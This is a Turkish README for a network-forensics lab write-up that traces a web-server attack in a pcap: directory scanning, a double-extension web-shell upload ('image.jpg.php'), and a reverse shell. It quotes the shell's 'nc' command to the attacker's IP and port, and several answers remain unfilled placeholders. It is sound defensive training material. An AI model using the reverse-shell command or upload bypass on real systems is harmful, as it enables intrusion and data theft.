# Vaka Analizi: WebStrike — Web Sunucusu İstismarı ve Ters Kabuk Yerleştirilmesi

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](./LICENSE)
![Wireshark](https://img.shields.io/badge/Tool-Wireshark-blue)
![Network Forensics](https://img.shields.io/badge/Discipline-Network%20Forensics-lightgrey)
[![Author: iamhasancoskun](https://img.shields.io/badge/Author-iamhasancoskun-black)](https://github.com/iamhasancoskun)

English ([README.en.md](README.en.md)) | Türkçe (bu sayfa)

| Kategori | Açıklama |
| :--- | :--- |
| **Odak Alanı** | Ağ Adli Bilişimi (Network Forensics), Web Uygulama Saldırıları, Olay Müdahale |
| **Delil** | `WebStrike.pcap` (Ağ Trafiği Kaydı) |
| **Ana Araçlar** | Wireshark, IP Geolocation Servisleri, TCP Stream Analizi |

---

## 1. Özet (Executive Summary)
Bu rapor, bir web sunucusuna yönelik gerçekleştirilen siber saldırının ağ trafiği kayıtları (.pcap) üzerinde yapılan adli bilişim analizinin bulgularını sunmaktadır. **Wireshark** kullanılarak yapılan inceleme sonucunda, **117.11.88.124** IP adresinden kaynaklanan bir saldırganın, web sitesindeki dosya yükleme zafiyetini istismar ettiği kanıtlanmıştır. Saldırgan, kendini normal bir Firefox kullanıcısı gibi gizleyerek (maskeleyerek), sunucuya **image.jpg.php** adında kötü amaçlı bir web kabuğu (web shell) yüklemeyi başarmıştır. Bu web kabuğu, saldırganın makinesindeki **8080** portuna bir ters kabuk (reverse shell) bağlantısı başlatarak, sunucu üzerinde tam komut satırı erişimi elde etmesini sağlamıştır. Analiz, saldırganın nihai hedefinin sistemdeki hassas bir dosyayı sızdırmak olduğunu ortaya koymuştur.

---

## 2. Adım Adım Teknik Analiz Süreci
Bu analiz, her adımda bir hipotez kurup, bu hipotezi test etmek için ilgili aracı seçerek ilerleyen "Hipotez Odaklı Yaklaşım" ile yürütülmüştür.

### Faz 1: Tehdit Aktörünün Tespiti ve Kimlik Analizi
**Hipotez:** Ağ trafiği içinde, web sunucusuna yönelik anormal ve tekrarlayan isteklerde bulunan bir kaynak IP adresi tespit edilmelidir.

- **Yöntem:** .pcap dosyası Wireshark ile açıldı ve HTTP trafiği (`http` filtresi) incelendi.
- **Bulgular:** **117.11.88.124** IP adresinin, sunucunun (**24.49.63.79**) `/admin/`, `/uploads/` gibi çeşitli dizinlerini taradığı ve çok sayıda istek gönderdiği tespit edildi. Bu davranış, keşif aşamasındaki bir saldırganı işaret ediyordu.

#### Saldırgan IP'sinin Coğrafi Konumu
- **Soru:** Saldırı hangi şehirden kaynaklanmıştır?
- **Cevap:** [IP geolocation servisinden bulunan şehir ismi]

#### User-Agent Analizi
- **Soru:** Saldırganın tam User-Agent'ı nedir?
- **Cevap:** `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0`
- **Yorum:** Bu User-Agent, normal bir Linux/Firefox kullanıcısına aittir. Ancak saldırganın davranışları (dizin tarama, dosya yükleme) bu kimlikle çelişmektedir. Bu, saldırganın gerçek kimliğini gizlemek için **Maskeleme (T1036)** tekniğini kullandığına dair güçlü bir işarettir.

![Saldırgan IP ve User-Agent](assets/01-attacker-ip-useragent.png)

### Faz 2: İstismar (Exploitation) ve Web Kabuğu Yüklemesi
**Hipotez:** Saldırgan, keşif aşamasından sonra bulduğu bir zafiyeti kullanarak sunucuya kötü amaçlı bir dosya yüklemiş olmalıdır. Bu eylem, bir HTTP POST isteği olarak trafikte görülecektir.

- **Yöntem:** Trafik, `http.request.method == "POST"` filtresi ile incelendi. İlgili TCP akışı (Follow > TCP Stream) analiz edildi.
- **Bulgular:** Saldırganın, `/reviews/upload.php` script'ine bir POST isteği göndererek, `filename="image.jpg.php"` adında bir dosya yüklediği tespit edildi.

#### Yüklenen Dosyanın Analizi
- **Soru:** Başarıyla yüklenen kötü amaçlı web kabuğunun adı nedir?
- **Cevap:** `image.jpg.php`
- **Yorum:** `.jpg.php` uzantısı, sunucudaki dosya türü filtrelerini atlatmak için kullanılan yaygın bir tekniktir.

![TCP Stream - Dosya Yükleme](assets/02-tcp-stream-upload.png)

### Faz 3: Kalıcılık ve Komuta & Kontrol (C2) Kurulumu
**Hipotez:** Yüklenen web kabuğu, saldırgana sunucu üzerinde kalıcı bir erişim sağlamak için bir Komuta & Kontrol (C2) kanalı oluşturmalıdır.

- **Yöntem:** Yüklenen `image.jpg.php` dosyasının içeriği, TCP akışından analiz edildi.
- **Bulgular:** Dosyanın içeriği, `nc 117.11.88.124 8080` komutunu içeren bir PHP ters kabuk (reverse shell) payload'uydu. Bu kod, sunucunun, saldırganın makinesindeki 8080 portuna bağlanmasını sağlar.

#### C2 Kanalının Tespiti
- **Soru:** Web kabuğu hangi portu hedeflemiştir?
- **Cevap:** **8080**
- **Soru:** Yüklenen dosyalar hangi dizinde saklanmaktadır?
- **Cevap:** `/reviews/uploads/` (Bu, saldırganın yükleme sonrası dosyayı çağırdığı GET isteğinden doğrulanmıştır).

![Web Shell İçeriği](assets/03-web-shell-content.png)

### Faz 4: Hedef Eylem (Actions on Objectives)
**Hipotez:** Ters kabuk bağlantısı kurulduktan sonra, saldırgan sistemdeki değerli verileri sızdırmaya (exfiltrate) çalışacaktır.

- **Yöntem:** Ters kabuk iletişimini içeren TCP trafiği (`tcp.port == 8080`) incelendi ve "Follow TCP Stream" ile komutlar analiz edildi.
- **Bulgular:** Saldırganın, `cat` komutunu kullanarak hassas bir sistem dosyasının içeriğini okumaya çalıştığı tespit edildi.

#### Hedef Dosyanın Tespiti
- **Soru:** Saldırgan hangi dosyayı sızdırmaya çalışıyordu?
- **Cevap:** [TCP akışından bulunan dosya adı/yolu, örneğin `/etc/passwd`]

![Ters Kabuk Komutları](assets/04-reverse-shell-commands.png)

---

## 3. Sonuç ve Göstergeler (Indicators of Compromise - IOCs)
Bu analiz, WebStrike saldırısının aşamalarını, kullanılan teknikleri ve hedefleri başarıyla ortaya çıkarmıştır.

| Tür | Değer |
|---|---|
| **Saldırgan IP Adresi** | `117.11.88.124` |
| **Kurban IP Adresi** | `24.49.63.79` |
| **Saldırgan User-Agent** | `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0` |
| **Yüklenen Dosya** | `image.jpg.php` |
| **Yükleme Dizini** | `/reviews/uploads/` |
| **C2 Portu** | `8080` |
| **Hedeflenen Dosya** | [Faz 4'te bulunan dosya adı] |

---

## Ek A: MITRE ATT&CK Eşleştirmesi
- **T1190 (Exploit Public-Facing Application):** `/reviews/upload.php` script'indeki zafiyetin istismar edilmesi.
- **T1589.001 (Gather Victim Identity Information: Credentials):** Hassas bir sistem dosyasını (`/etc/passwd` gibi) hedef alması.
- **T1071.001 (Application Layer Protocol: Web Protocols):** Saldırının tamamının HTTP/HTTPS üzerinden gerçekleştirilmesi.
- **T1059.004 (Command and Scripting Interpreter: Unix Shell):** Ters kabuk üzerinden `/bin/sh` kullanılması.
- **T1036 (Masquerading):** Kendini normal bir Firefox kullanıcısı gibi göstermesi ve dosya adını `.jpg.php` olarak gizlemesi.

---

## Ek B: Tekrarlanabilirlik ve Komutlar
Aşağıdaki komutlar, bu depodaki dizin düzeni ile birebir çalışacak şekilde verilmiştir.

```bash
# Wireshark filtreleri
http                          # HTTP trafiği
http.request.method == "POST" # POST istekleri
tcp.port == 8080             # C2 portu
ip.addr == 117.11.88.124    # Saldırgan IP'si
ip.addr == 24.49.63.79      # Kurban IP'si

# TCP Stream analizi
# Wireshark: Sağ tık > Follow > TCP Stream
# Stream numarası: [TCP akış numarası]

# Dosya içeriği analizi
# TCP Stream'de filename="image.jpg.php" arama
# PHP payload içeriğini inceleme
```

---

## Ek C: Ağ Adli Bilişimi Metodolojisi
Bu vaka, standart ağ adli bilişimi metodolojisini göstermektedir:

1. **Trafik Yakalama:** .pcap dosyası ile ağ trafiği kaydedilir
2. **Filtreleme:** HTTP, TCP port, IP adresi bazında filtreleme
3. **Akış Analizi:** TCP Stream ile uygulama katmanı verisi
4. **Payload İnceleme:** Dosya yükleme ve komut içerikleri
5. **Zaman Çizelgesi:** Saldırı aşamalarının kronolojik analizi
6. **IOC Çıkarımı:** IP, port, dosya, komut göstergeleri

---

Yazar: [iamhasancoskun](https://github.com/iamhasancoskun)
